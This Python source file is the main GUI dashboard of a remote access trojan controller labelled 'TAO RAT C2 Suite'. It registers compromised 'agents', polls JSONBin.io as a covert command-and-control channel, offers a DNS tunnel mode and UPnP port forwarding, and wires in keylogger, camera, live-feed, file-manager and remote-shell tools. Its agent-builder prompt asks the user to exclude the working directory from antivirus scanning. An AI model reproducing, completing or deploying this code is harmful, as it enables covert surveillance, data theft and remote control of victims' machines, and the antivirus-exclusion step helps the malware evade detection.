import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from tkinter import font as tkfont
import json
import os
import requests
from threading import Thread, Lock
import queue
import time
import re
from datetime import datetime
import socket
import threading
import subprocess
import struct
import base64

from core.state import (
    CONFIG_FILE, STATUS_FILE, AGENTS_FILE, LOG_FILE, TOOLS_CONFIG,
    JSON_FOLDER, OUTPUT_FOLDER, MODE_FILE, AgentMode, ActiveSession
)
from core.config import c_mode, save_c_mode, lc, sc, validate_startup
from core.agent_store import load_agents, save_agent, reset_agents_file
from network.dns_mode import DNSMode, UPnPPortForwarder
from network.http_agent import poll_http_agents
from ui.shell_console import ShellConsoleWindow
from ui.agent_selector import AgentSelectorWindow, DNSConfigWindow
from ui.agent_settings import AgentSettingsWindow
from ui.dialogs import JSONBinEditorWindow, MessageDialogWindow
from tools.live_feed import LiveFeedWindow, EmbeddedLiveFeed
from tools.keylogger import KeylogClient, KeyloggerWindow
from tools.camera import CameraClient, CameraWindow
from tools.file_manager import FileManagerWindow
from tools.tcp_client import TCPVideoClient, AudioClient


class RC:
    def __init__(self, root):
        self.root = root
        self.root.title("Dashboard")
        self.root.geometry("900x600")
        self.root.resizable(False, False)
        menu_font = tkfont.Font(family="Segoe UI", size=10)
        self.config = self.lc()
        self.session = requests.Session()
        self.update_queue = queue.Queue()
        if not self.validate_startup():
            return
        ActiveSession.set(None)
        self._reset_all_agents_session_state()
        self.selected_agent_data = None
        self.agent_refresh_job = None
        self.temp_http_agent = None
        self.api_change_state = None
        self.api_change_temp = {}
        self.connection_active = False
        self.last_response_time = None
        self.system_info_received = False
        self.awaiting_command_result = False
        self.last_cmd_result_displayed = ""
        self._handshake_pending = False
        self.active_mode = "http"
        self.controller_state = "polling"
        self.mode_switching = False
        self._op_lock_active = False 
        self._dns_disconnected_agents = set() 
        self.dns_mode = DNSMode(self)
        self.port_forwarder = UPnPPortForwarder(self)
        self.mode_lock = Lock()

        self.live_feed_window = None
        self.tools_window = None
        self.shell_console = None

        self.monitor2_loaded = False
        self.monitor2_loading = False
        self.active_tool_windows = {
            'live_feed': None,
            'keylogger': None,
            'camera': None,
            'file_manager': None,
            'message': None,
        }

        self.in_interactive_session = False
        self.interactive_session_name = None
        self.interactive_commands = ["diskpart", "powershell", "cmd", "ftp", "telnet"]

        self.style()
        os.makedirs(OUTPUT_FOLDER, exist_ok=True)
        self.widgets()

        self.updateszwei()

        saved_mode = c_mode()

        if saved_mode == "dns":
            self._log_system("Previous session: TUNNEL Mode")
            self.active_mode = "dns"
            self.upmdui()
            self._log_system("Select an agent to connect")
        elif saved_mode == "jsonbin" or saved_mode == "http":
            self._log_system("Previous session: HTTP mode")
            self.active_mode = "http"
            self.upmdui()
        else:
            self.active_mode = "http"
            self._log_system(
                "Click 'Refresh HTTP' to start polling or "
                "double-click an existing agent to connect."
            )

        self.root.after(500, self.refresh_treeview)

    def lc(self):
        os.makedirs(JSON_FOLDER, exist_ok=True)
        default_config = {
            "BIN_ID": "", "API_KEY": "", "URL": "",
            "DEVICE_IP": "N/A", "FERNET_KEY": "",
        }
        if not os.path.exists(CONFIG_FILE):
            return default_config.copy()
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default_config.copy()

    def validate_startup(self):
        config_exists = os.path.exists(CONFIG_FILE)
        bin_id    = self.config.get("BIN_ID",     "").strip()
        api_key   = self.config.get("API_KEY",    "").strip()
        url       = self.config.get("URL",        "").strip()
        fernet_key = self.config.get("FERNET_KEY","").strip()
        has_valid_credentials = bool(bin_id and api_key and url and fernet_key)
        if not config_exists or not has_valid_credentials:
            return self.show_first_run_wizard()
        return True

    def show_first_run_wizard(self):
        wizard = tk.Toplevel(self.root)
        wizard.title("Setup Configuration")
        wizard.geometry("600x550")
        wizard.configure(bg="#1A1212")
        wizard.resizable(False, False)
        wizard.transient(self.root)
        wizard.grab_set()
        wizard.protocol("WM_DELETE_WINDOW", lambda: None)

        header = tk.Frame(wizard, bg="#2C1E1E", height=80)
        header.pack(fill="x")
        header.pack_propagate(False)
        tk.Label(header, text="Welcome to TAO RAT C2 Suite",
                 bg="#2C1E1E", fg="#D9A86C",
                 font=("Arial", 16, "bold")).pack(pady=(15, 5))
        tk.Label(header, text="Setup Configuration",
                 bg="#2C1E1E", fg="#F2E9E4",
                 font=("Arial", 10)).pack()

        content = tk.Frame(wizard, bg="#1A1212")
        content.pack(fill="both", expand=True, padx=20, pady=20)

        warning_msg = (
            "Configuration not found in JSON Folder"
            if not os.path.exists(CONFIG_FILE)
            else "Configuration is incomplete or invalid"
        )
        tk.Label(content, text=warning_msg, bg="#1A1212", fg="#FF9800",
                 font=("Arial", 11, "bold")).pack(pady=(10, 5))
        tk.Label(content, text="\nPlease configure your JSONBin.io credentials:",
                 bg="#1A1212", fg="#D9A86C",
                 font=("Arial", 11, "bold")).pack(pady=(20, 10))

        def _row(label_text, show=""):
            frm = tk.Frame(content, bg="#1A1212")
            frm.pack(fill="x", pady=5)
            tk.Label(frm, text=label_text, bg="#1A1212", fg="#F2E9E4",
                     font=("Arial", 10), width=15, anchor="w").pack(side="left")
            ent = tk.Entry(frm, bg="#0D0D0D", fg="#00FF00",
                           font=("Consolas", 10), insertbackground="white",
                           show=show)
            ent.pack(side="left", fill="x", expand=True, padx=5)
            return ent, frm

        bin_entry,    _  = _row("BIN ID:")
        api_entry,    _  = _row("API Key:", show="*")
        url_entry,    url_frm = _row("URL:")
        fernet_entry, _  = _row("Fernet Key:", show="*")

        bin_entry.insert(0,    self.config.get("BIN_ID",     ""))
        api_entry.insert(0,    self.config.get("API_KEY",    ""))
        url_entry.insert(0,    self.config.get("URL",        ""))
        fernet_entry.insert(0, self.config.get("FERNET_KEY", ""))

        auto_url_var = tk.BooleanVar(value=False)
        tk.Checkbutton(url_frm, text="Auto-generate", variable=auto_url_var,
                       bg="#1A1212", fg="#F2E9E4", selectcolor="#2C1E1E",
                       activebackground="#1A1212",
                       font=("Arial", 8)).pack(side="left", padx=5)

        info_box = tk.Frame(content, bg="#2C1E1E", relief="groove", borderwidth=2)
        info_box.pack(fill="x", pady=15)
        tk.Label(info_box,
                 text=(
                     "ℹ️ Information:\n"
                     "• Get your JSONBin.io credentials from jsonbin.io\n"
                     "• Fernet key is used for agent encryption\n"
                     "• All fields are required to proceed\n"
                     "• These settings can be changed later in Settings"
                 ),
                 bg="#2C1E1E", fg="#888888",
                 font=("Arial", 9), justify="left").pack(padx=10, pady=10)

        btn_frame = tk.Frame(content, bg="#1A1212")
        btn_frame.pack(fill="x", pady=(10, 0))

        def save_and_continue():
            bid  = bin_entry.get().strip()
            akey = api_entry.get().strip()
            u    = url_entry.get().strip()
            fkey = fernet_entry.get().strip()
            if not bid or not akey or not fkey:
                messagebox.showerror("Validation Error",
                                     "BIN ID, API Key, and Fernet Key are required!")
                return
            if auto_url_var.get():
                u = f"https://api.jsonbin.io/v3/b/{bid}"
                url_entry.delete(0, tk.END)
                url_entry.insert(0, u)
            if not u:
                messagebox.showerror("Validation Error",
                                     "URL is required! Enable auto-generate or enter manually.")
                return
            self.config["BIN_ID"]     = bid
            self.config["API_KEY"]    = akey
            self.config["URL"]        = u
            self.config["FERNET_KEY"] = fkey
            try:
                os.makedirs(JSON_FOLDER, exist_ok=True)
                with open(CONFIG_FILE, 'w') as f:
                    json.dump(self.config, f, indent=4)
                messagebox.showinfo("Success",
                                    "Configuration saved!\n\nClick OK to continue.")
                wizard.destroy()
            except Exception as e:
                messagebox.showerror("Save Error", f"Failed to save configuration:\n{e}")

        tk.Button(btn_frame, text="💾 Save & Continue", command=save_and_continue,
                  bg="#4CAF50", fg="white", font=("Arial", 10, "bold"),
                  padx=20, pady=8).pack(side="left", padx=5)
        tk.Button(btn_frame, text="✕ Exit",
                  command=lambda: [wizard.destroy(), self.root.destroy()],
                  bg="#666666", fg="white", font=("Arial", 10, "bold"),
                  padx=20, pady=8).pack(side="right", padx=5)

        wizard.wait_window()
        return (os.path.exists(CONFIG_FILE)
                and bool(self.config.get("BIN_ID"))
                and bool(self.config.get("API_KEY")))

    def sc(self):
        try:
            os.makedirs(JSON_FOLDER, exist_ok=True)
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
        except IOError as e:
            messagebox.showerror("Registry Error", f"Failed to record config: {e}")

    def get_root_dir(self):
        base_dir = os.environ.get('TAO_BASE_DIR')
        if not base_dir:
            current_file_dir = os.path.dirname(os.path.abspath(__file__))
            base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
        return base_dir


    def load_agents(self):
        try:
            if os.path.exists(AGENTS_FILE):
                with open(AGENTS_FILE, 'r') as f:
                    data = json.load(f)
                if not isinstance(data, list):
                    self._log_m("WARNING: agents.json corrupted, resetting...")
                    return []
                valid = [a for a in data if isinstance(a, dict)]
                if len(valid) != len(data):
                    self._log_m(
                        f"WARNING: Removed {len(data) - len(valid)} "
                        "invalid entries from agents.json"
                    )
                return valid
            return []
        except json.JSONDecodeError as e:
            self._log_m(f"ERROR: agents.json is corrupted: {e}")
            if os.path.exists(AGENTS_FILE):
                backup = AGENTS_FILE + ".corrupted"
                try:
                    import shutil
                    shutil.copy(AGENTS_FILE, backup)
                    self._log_m(f"Corrupted file backed up to: {backup}")
                except Exception:
                    pass
            return []
        except Exception as e:
            self._log_m(f"Error loading agents: {e}")
            return []

    def save_agent(self, agent_data):
        try:
            if not isinstance(agent_data, dict):
                self._log_system(
                    f"ERROR: agent_data must be dict, got {type(agent_data)}")
                return False

            agents = self.load_agents()
            if not isinstance(agents, list):
                agents = []

            device_name = agent_data.get('device_name', '')
            device_ip   = agent_data.get('device_ip',   '')
            if not device_name or not device_ip:
                self._log_system("ERROR: Agent data missing device_name or device_ip")
                return False

            agent_id = device_name + "_" + device_ip
            agents = [
                a for a in agents
                if isinstance(a, dict)
                and (a.get('device_name', '') + "_" + a.get('device_ip', '')) != agent_id
            ]

            agent_data['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            if os.path.exists(STATUS_FILE):
                try:
                    with open(STATUS_FILE, 'r') as f:
                        audit = f.read()
                    m = re.search(r"OS Name:\s+(.*)", audit)
                    if m:
                        agent_data['os_version'] = m.group(1).strip()
                except Exception:
                    pass

            agents.append(agent_data)
            agents = agents[-50:]

            os.makedirs(JSON_FOLDER, exist_ok=True)
            with open(AGENTS_FILE, 'w') as f:
                json.dump(agents, f, indent=4)

            self._log_system(
                f"SYS: Agent registered: {agent_data.get('device_name', 'Unknown')}")
            return True
        except Exception as e:
            self._log_system(f"Error saving agent: {e}")
            import traceback
            self._log_system(traceback.format_exc())
            return False

    def reset_agents_file(self):
        try:
            if os.path.exists(AGENTS_FILE):
                backup = AGENTS_FILE + f".backup_{int(time.time())}"
                import shutil
                shutil.copy(AGENTS_FILE, backup)
                self._log_m(f"Backed up to: {backup}")
            with open(AGENTS_FILE, 'w') as f:
                json.dump([], f, indent=4)
            self._log_m("SYS: agents.json reset successfully")
            return True
        except Exception as e:
            self._log_m(f"ERROR resetting agents.json: {e}")
            return False

    def _reset_all_agents_session_state(self):
        try:
            if not os.path.exists(AGENTS_FILE):
                return
            with open(AGENTS_FILE, 'r') as f:
                agents = json.load(f)
            if not isinstance(agents, list):
                return
            changed = False
            for a in agents:
                if isinstance(a, dict) and a.get('session_active', False):
                    a['session_active'] = False
                    changed = True
            if changed:
                with open(AGENTS_FILE, 'w') as f:
                    json.dump(agents, f, indent=4)
                self._log_m(
                    "SYS: Session state reset — all agents set to disconnected on startup")
        except Exception as e:
            self._log_m(f"WARN: Could not reset agent session state on startup: {e}")

    def style(self):
        self.colors = {
            "plum_dark":   "#2C1E1E",
            "crimson":     "#A63429",
            "gold":        "#D9A86C",
            "spirit_white":"#F2E9E4",
            "bg_dark":     "#1A1212",
            "console_bg":  "#0D0D0D",
            "green":       "#4CAF50",
            "red":         "#FF4444",
            "blue":        "#5DADE2",
            "orange":      "#FF9800",
        }
        self.root.configure(bg=self.colors["bg_dark"])

        s = ttk.Style()
        s.theme_use("clam")
        s.configure("Treeview",
                    background=self.colors["bg_dark"],
                    foreground=self.colors["spirit_white"],
                    fieldbackground=self.colors["bg_dark"],
                    rowheight=30, borderwidth=0)
        s.configure("Treeview.Heading",
                    background=self.colors["plum_dark"],
                    foreground=self.colors["gold"],
                    font=("Arial", 10, "bold"))
        s.map("Treeview",
              background=[("selected", self.colors["crimson"])])
        s.configure("TNotebook",
                    background=self.colors["bg_dark"], borderwidth=0)
        s.configure("TNotebook.Tab",
                    background=self.colors["plum_dark"],
                    foreground=self.colors["spirit_white"],
                    padding=[15, 5])
        s.map("TNotebook.Tab",
              background=[("selected", self.colors["crimson"])])

    def widgets(self):
        nav_bar = tk.Frame(self.root, bg=self.colors["plum_dark"], height=50)
        nav_bar.pack(fill="x", side="top")
        nav_bar.pack_propagate(False)

        tk.Button(nav_bar, text="Build Agents",
                  bg=self.colors["bg_dark"], fg="white",
                  font=("Arial", 9, "bold"), relief="flat", padx=15,
                  command=self.build_agents_prompt
                  ).pack(side="left", padx=1, fill="y")

        tk.Label(nav_bar, text="|",
                 bg=self.colors["plum_dark"], fg="#555").pack(side="left")

        self.btn_settings = tk.Button(
            nav_bar, text="⚙ Settings", command=self.open_agent_settings,
            bg="#555555", fg="gray", font=("Arial", 9, "bold"),
            padx=15, relief="flat", state="disabled")
        self.btn_settings.pack(side="right", padx=5, pady=5)

        self.btn_refresh_tunnel = tk.Button(
            nav_bar, text="⟳ Refresh Tunnel",
            command=self.refresh_tunnel,
            bg="#555555", fg="white", font=("Arial", 10, "bold"),
            padx=15, relief="flat", state="disabled")
        self.btn_refresh_tunnel.pack(side="right", padx=5, pady=5)

        self.btn_refresh_http = tk.Button(
            nav_bar, text="⟳ Refresh HTTP",
            command=self.refresh_http,
            bg=self.colors["gold"], fg="white", font=("Arial", 10, "bold"),
            padx=15, relief="flat")
        self.btn_refresh_http.pack(side="right", padx=5, pady=5)

        cred_frame = tk.LabelFrame(
            self.root, text=" ✦ JSONBin Credentials ✦ ",
            bg=self.colors["plum_dark"], fg=self.colors["gold"])
        cred_frame.pack(fill="x", padx=10, pady=5)

        cred_row1 = tk.Frame(cred_frame, bg=self.colors["plum_dark"])
        cred_row1.pack(fill="x", padx=10, pady=5)

        tk.Label(cred_row1, text="BIN ID:",
                 bg=self.colors["plum_dark"],
                 fg=self.colors["spirit_white"]).pack(side="left")
        self.bin_id_entry = tk.Entry(
            cred_row1, width=12,
            bg=self.colors["bg_dark"], fg=self.colors["gold"],
            insertbackground="white", borderwidth=0)
        self.bin_id_entry.pack(side="left", padx=5)
        self.bin_id_entry.insert(0, self.config.get("BIN_ID", ""))

        tk.Label(cred_row1, text="API:",
                 bg=self.colors["plum_dark"],
                 fg=self.colors["spirit_white"]).pack(side="left")
        self.api_key_entry = tk.Entry(
            cred_row1, width=15, show="*",
            bg=self.colors["bg_dark"], fg=self.colors["gold"],
            insertbackground="white", borderwidth=0)
        self.api_key_entry.pack(side="left", padx=5)
        self.api_key_entry.insert(0, self.config.get("API_KEY", ""))

        tk.Label(cred_row1, text="URL:",
                 bg=self.colors["plum_dark"],
                 fg=self.colors["spirit_white"]).pack(side="left")
        self.url_entry = tk.Entry(
            cred_row1, width=25,
            bg=self.colors["bg_dark"], fg=self.colors["gold"],
            insertbackground="white", borderwidth=0)
        self.url_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.url_entry.insert(0, self.config.get("URL", ""))

        tk.Button(cred_row1, text="✏️ Edit",
                  command=self.open_jsonbin_editor,
                  bg=self.colors["blue"], fg="white",
                  font=("Arial", 9, "bold"), padx=10
                  ).pack(side="right", padx=5)

        cred_row2 = tk.Frame(cred_frame, bg=self.colors["plum_dark"])
        cred_row2.pack(fill="x", padx=10, pady=(0, 5))

        tk.Label(cred_row2, text="Fernet Key:",
                 bg=self.colors["plum_dark"],
                 fg=self.colors["spirit_white"]).pack(side="left")
        self.fernet_entry = tk.Entry(
            cred_row2, width=50, show="*",
            bg=self.colors["bg_dark"], fg=self.colors["gold"],
            insertbackground="white", borderwidth=0, state="readonly")
        self.fernet_entry.pack(side="left", padx=5)

        fernet_key = self.config.get("FERNET_KEY", "")
        if fernet_key:
            self.fernet_entry.config(state="normal")
            self.fernet_entry.insert(0, fernet_key)
            self.fernet_entry.config(state="readonly")

        list_frame = tk.Frame(self.root, bg=self.colors["bg_dark"])
        list_frame.pack(fill="both", expand=True, padx=20, pady=20)

        columns = ("name", "ip", "os", "mode", "status")
        self.tree = ttk.Treeview(
            list_frame, columns=columns,
            show="headings", selectmode="browse")
        self.tree.heading("name",   text="Device Name")
        self.tree.heading("ip",     text="IP Address")
        self.tree.heading("os",     text="OS Version")
        self.tree.heading("mode",   text="Mode")
        self.tree.heading("status", text="Status")
        self.tree.column("name",   width=180)
        self.tree.column("ip",     width=130)
        self.tree.column("os",     width=220)
        self.tree.column("mode",   width=80,  anchor="center")
        self.tree.column("status", width=100, anchor="center")

        scrollbar = ttk.Scrollbar(
            list_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        self.tree.bind("<<TreeviewSelect>>", self.on_agent_select)
        self.tree.bind("<Button-3>",         self.show_context_menu)
        self.tree.bind("<Double-1>",         self._on_tree_double_click)
        self.tree.tag_configure('mode0',      foreground=self.colors["orange"])
        self.tree.tag_configure('mode1',      foreground=self.colors["green"])
        self.tree.tag_configure('mode2',      foreground=self.colors["blue"])
        self.tree.tag_configure('mode2_disc', foreground=self.colors["red"])
        self.tree.tag_configure('disabled',   foreground='#888888')

        footer = tk.Frame(self.root, bg=self.colors["plum_dark"], height=25)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)
        self.footer_lbl = tk.Label(
            footer,
            text="✦ Ready - Select HTTP Mode to discover agents",
            bg=self.colors["plum_dark"], fg=self.colors["gold"],
            font=("Consolas", 9), anchor="w")
        self.footer_lbl.pack(fill="x", padx=10)


    def _on_tree_double_click(self, event):
        selection = self.tree.selection()
        if not selection:
            return
        tags = self.tree.item(selection[0]).get('tags', [])
        if 'mode0' in tags:
            return
        self.on_dns_click()

    def build_agents_prompt(self):
        confirm = messagebox.askyesno(
            "Build Environment Setup",
            "You are now accessing Rootkit-chan's Agent Builder!\n\n"
            "To prevent false positives during the agent compilation process, "
            "this builder needs to temporarily add its working directory "
            "to the exclusion list.\n\n"
            "Select 'Yes' to proceed.\n"
            "Select 'No' to cancel and exit.",
            icon='warning', parent=self.root)

        if confirm:
            self.footer_lbl.config(
                text="Initializing build environment...",
                fg=self.colors["gold"])

            base_dir = os.environ.get('TAO_BASE_DIR')
            if not base_dir:
                if getattr(subprocess, 'frozen', False):
                    import sys
                    base_dir = os.path.dirname(sys.executable)
                else:
                    current_file_dir = os.path.dirname(os.path.abspath(__file__))
                    base_dir = os.path.abspath(
                        os.path.join(current_file_dir, ".."))

            builder_exe = os.path.join(base_dir, "builder", "builder.exe")
            if os.path.exists(builder_exe):
                try:
                    self.footer_lbl.config(
                        text="Starting Builder...", fg=self.colors["green"])
                    subprocess.Popen(
                        [builder_exe],
                        cwd=os.path.dirname(builder_exe),
                        creationflags=subprocess.CREATE_NEW_CONSOLE)
                    print(f"Launched: {builder_exe}")
                except Exception as e:
                    messagebox.showerror("Execution Error",
                                         f"Could not start builder: {e}")
                    self.footer_lbl.config(
                        text="Execution Failed", fg=self.colors["red"])
            else:
                self.footer_lbl.config(
                    text="Build Tool Missing", fg=self.colors["red"])
                messagebox.showerror(
                    "File Not Found",
                    f"Error: builder.exe not found at:\n{builder_exe}")
        else:
            self.footer_lbl.config(
                text="Build cancelled by user.", fg=self.colors["red"])

    def open_jsonbin_editor(self):
        if (hasattr(self, 'jsonbin_editor')
                and self.jsonbin_editor.window.winfo_exists()):
            self.jsonbin_editor.window.lift()
            return
        self.jsonbin_editor = JSONBinEditorWindow(self.root, self)
        self._log_system("JSONBin editor opened")

    def open_agent_settings(self):
        if not self.selected_agent_data:
            messagebox.showwarning("No Agent Selected",
                                   "Please select an agent first")
            return
        if (hasattr(self, 'agent_settings')
                and self.agent_settings.window.winfo_exists()):
            self.agent_settings.window.lift()
            return
        self.agent_settings = AgentSettingsWindow(
            self.root, self, self.selected_agent_data)
        self._log_system(
            f"Agent settings opened for "
            f"{self.selected_agent_data.get('device_name')}")

    def open_shell_console(self):
        if self.active_mode == "dns":
            if not self.dns_mode.current_agent_id:
                messagebox.showerror("Not Connected",
                                     "No agent connected via DNS")
                return
        else:
            if not self.selected_agent_data:
                messagebox.showerror("Not Connected", "No agent selected")
                return
        ShellConsoleWindow(self.root, self)
        self._log_system("Shell console opened")

    def show_console(self):
        if hasattr(self, 'console_window') and self.console_window.winfo_exists():
            self.console_window.lift()
            return
        self.console_window = tk.Toplevel(self.root)
        self.console_window.title("📋 Console Logs")
        self.console_window.geometry("800x500")
        self.console_window.configure(bg=self.colors["bg_dark"])

        self.log_text = scrolledtext.ScrolledText(
            self.console_window,
            bg=self.colors["console_bg"],
            fg=self.colors["spirit_white"],
            font=("Consolas", 9),
            insertbackground=self.colors["gold"],
            wrap="word", state="disabled")
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)

        tk.Button(self.console_window, text="🗑 Clear",
                  command=self._cc,
                  bg=self.colors["crimson"], fg="white",
                  font=("Arial", 9, "bold"),
                  padx=15, pady=5).pack(pady=5)


    def _log_system(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {msg}")
        self.footer_lbl.config(text=f"✦ {msg}")
        if hasattr(self, 'console_window') and hasattr(self, 'log_text'):
            try:
                if self.console_window.winfo_exists():
                    self.log_text.config(state='normal')
                    self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
                    self.log_text.see(tk.END)
                    self.log_text.config(state='disabled')
            except Exception:
                pass

    def _log_m(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S')
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        clean = ansi_escape.sub('', message)
        print(f"[{timestamp}] {clean}")
        if hasattr(self, 'footer_lbl'):
            disp = clean[:100] + "..." if len(clean) > 100 else clean
            self.footer_lbl.config(text=f"✦ {disp}")
        if hasattr(self, 'shell_console') and self.shell_console:
            try:
                self.shell_console._log(clean)
            except Exception:
                pass
        if hasattr(self, 'console_window') and hasattr(self, 'log_text'):
            try:
                if self.console_window.winfo_exists():
                    self.log_text.config(state='normal')
                    self.log_text.insert(tk.END, f"[{timestamp}] {clean}\n")
                    self.log_text.see(tk.END)
                    self.log_text.config(state='disabled')
            except Exception:
                pass

    def _cc(self):
        if hasattr(self, 'log_text'):
            self.log_text.config(state='normal')
            self.log_text.delete('1.0', tk.END)
            self.log_text.config(state='disabled')
        self._log_system("Console cleared")

    def _set_controller_state(self, new_state: str):
        if new_state not in ("disconnected", "polling", "connected"):
            return
        self.controller_state = new_state
        labels = {
            "disconnected": ("DISCONNECTED", self.colors["red"]),
            "polling":      ("POLLING",      self.colors["gold"]),
            "connected":    ("CONNECTED",    self.colors["green"]),
        }
        text, color = labels[new_state]
        if hasattr(self, 'footer_lbl'):
            self.footer_lbl.config(text=f"✦ {text}", fg=color)


    def _acquire_op_lock(self):

        if self._op_lock_active:
            return False
        self._op_lock_active = True
        self._disable_op_buttons()
        self.root.after(3000, self._release_op_lock)
        return True

    def _release_op_lock(self):

        if not self._op_lock_active:
            return         
        self._op_lock_active = False
        self._enable_op_buttons()

    def _disable_op_buttons(self):

        for btn in (self.btn_refresh_http, self.btn_refresh_tunnel, self.btn_settings):
            try:
                btn.config(state="disabled")
            except Exception:
                pass
        try:
            self.tree.config(selectmode="none")
            self.tree.unbind("<Button-3>")
            self.tree.unbind("<Double-1>")
        except Exception:
            pass

    def _enable_op_buttons(self):
        try:
            self.btn_refresh_http.config(state="normal")
            if self.active_mode == "dns" or self.selected_agent_data:
                self.btn_refresh_tunnel.config(state="normal")
            if self.selected_agent_data and self.controller_state == "connected":
                self.btn_settings.config(state="normal", bg=self.colors["gold"], fg="white")
            else:
                self.btn_settings.config(state="disabled", bg="#555555", fg="gray")
            self.tree.config(selectmode="browse")
            self.tree.bind("<Button-3>", self.show_context_menu)
            self.tree.bind("<Double-1>", self._on_tree_double_click)
        except Exception:
            pass

    def refresh_treeview(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

        agents = self.load_agents()

        all_entries = list(agents)
        if hasattr(self, 'temp_http_agent') and self.temp_http_agent:
            dn  = self.temp_http_agent.get('device_name')
            dip = self.temp_http_agent.get('device_ip')
            if not any(
                a.get('device_name') == dn and a.get('device_ip') == dip
                for a in agents
            ):
                all_entries.append(self.temp_http_agent)

        if not all_entries:
            self._log_system("No agents in registry. Poll HTTP to discover.")
            return

        current_session_id = ActiveSession.get()
        is_connected = bool(current_session_id)

        for agent in all_entries:
            status         = agent.get('device_status', 'unknown')
            is_dns         = agent.get('dns_ready', False)
            session_active = agent.get('session_active', True)
            is_temp        = (hasattr(self, 'temp_http_agent')
                              and agent is self.temp_http_agent)

            device_name = agent.get('device_name', 'Unknown')
            device_ip   = agent.get('device_ip',   'N/A')
            os_info     = agent.get('os_version',  'Windows')
            agent_id    = f"{device_name}_{device_ip}"

            item_id = self.tree.insert("", "end", values=(
                device_name,
                device_ip,
                os_info,
                "DNS" if is_dns else "HTTP",
                status.upper(),
            ))

            this_connected = (is_connected and current_session_id == agent_id)

            if is_temp:
                tag = 'mode0'
            elif is_dns:
                if agent_id in self._dns_disconnected_agents:
                    tag = 'mode2_disc' 
                elif this_connected or not is_connected:
                    tag = 'mode2' 
                else:
                    tag = 'disabled'
            else:
                if not session_active:
                    tag = 'disabled' if (is_connected and not this_connected) else 'mode1'
                else:
                    tag = 'mode1' if (this_connected or not is_connected) else 'disabled'


            self.tree.item(item_id, tags=(tag,))

    def on_agent_select(self, event):
        selection = self.tree.selection()
        if not selection:
            if self.active_mode == "http":
                self.btn_refresh_tunnel.config(state="disabled", bg="#555555")
            self.btn_settings.config(state="disabled", bg="#555555", fg="gray")
            self.selected_agent_data = None
            return

        item = self.tree.item(selection[0])
        vals = item['values']

        current_session_id = ActiveSession.get()
        if current_session_id:
            clicked_id = f"{vals[0]}_{vals[1]}"
            if clicked_id != current_session_id:
                self.tree.selection_remove(selection[0])
                return

        agents = self.load_agents()
        found  = False

        for a in agents:
            if a.get('device_name') == vals[0] and a.get('device_ip') == vals[1]:
                self.selected_agent_data = a
                found = True
                break

        if not found and hasattr(self, 'temp_http_agent') and self.temp_http_agent:
            if (self.temp_http_agent.get('device_name') == vals[0]
                    and self.temp_http_agent.get('device_ip') == vals[1]):
                self.selected_agent_data = self.temp_http_agent
                found = True
                self._log_system(f"Selected temporary HTTP agent: {vals[0]}")

        if found:
            self._log_system(f"Selected: {vals[0]} ({vals[1]})")

            if self.controller_state == "connected":
                self.btn_settings.config(
                    state="normal", bg=self.colors["gold"], fg="white")
            else:
                self.btn_settings.config(state="disabled", bg="#555555", fg="gray")

            if self.active_mode == "http":
                self.btn_refresh_tunnel.config(
                    state="normal", bg=self.colors["blue"])

            if not self.selected_agent_data.get('api_key'):
                self.selected_agent_data['api_key'] = \
                    self.api_key_entry.get().strip()
            if not self.selected_agent_data.get('url'):
                self.selected_agent_data['url'] = \
                    self.url_entry.get().strip()
            if not self.selected_agent_data.get('bin_id'):
                self.selected_agent_data['bin_id'] = \
                    self.bin_id_entry.get().strip()

            is_dns   = self.selected_agent_data.get('dns_ready', False)
            is_saved = (self.selected_agent_data
                        is not getattr(self, 'temp_http_agent', None))

            if is_saved and not is_dns and self.active_mode == "http":
                if getattr(self, '_handshake_pending', False):
                    return
                fresh_agents = self.load_agents()
                fresh = next(
                    (a for a in fresh_agents
                     if a.get('device_name') == self.selected_agent_data.get('device_name')
                     and a.get('device_ip')  == self.selected_agent_data.get('device_ip')),
                    None)
                if not fresh or not fresh.get('session_active', False):
                    return
                new_id = (self.selected_agent_data.get('device_name', '') + "_" +
                          self.selected_agent_data.get('device_ip',   ''))
                if ActiveSession.get() != new_id:
                    self._set_active_http_agent(self.selected_agent_data)

    def refresh_http(self):
        self._log_system("Refreshing HTTP agents from JSONBin...")
        Thread(target=self.poll_http_agents_dashboard, daemon=True).start()

    def poll_http_agents(self):
        url     = self.url_entry.get().strip()
        api_key = self.api_key_entry.get().strip()
        if not url or not api_key:
            self._log_m("SYS: Missing HTTP credentials for polling")
            return None
        try:
            headers  = {"X-Master-Key": api_key}
            response = self.session.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                record = self._gr(response.json())
                device_name   = record.get('device_name',   '')
                device_ip     = record.get('device_ip',     '')
                device_status = record.get('device_status', '')
                if device_name and device_ip and device_status == 'active':
                    agent_data = {
                        'device_name':        device_name,
                        'device_ip':          device_ip,
                        'device_status':      device_status,
                        'bin_id':             self.bin_id_entry.get().strip(),
                        'api_key':            api_key,
                        'url':                url,
                        'discovered_via':     'http',
                        'dns_ready':          False,
                        'dns_domain':         '',
                        'dns_port':           '',
                        'dns_encryption_key': '',
                    }
                    dns_domain = record.get('dns_domain', '')
                    dns_port   = record.get('dns_port',   '')
                    if dns_domain and dns_port:
                        agent_data['dns_domain'] = dns_domain
                        agent_data['dns_port']   = dns_port
                        agent_data['dns_ready']  = True
                    self._log_m(
                        f"HTTP: Detected agent {device_name} ({device_ip})")
                    return agent_data
        except Exception as e:
            self._log_m(f"HTTP polling error: {e}")
            import traceback
            self._log_m(traceback.format_exc())
        return None

    def poll_http_agents_dashboard(self):
        agent = self.poll_http_agents()
        if agent:
            self.root.after(0, lambda: self.update_http_agent_display(agent))
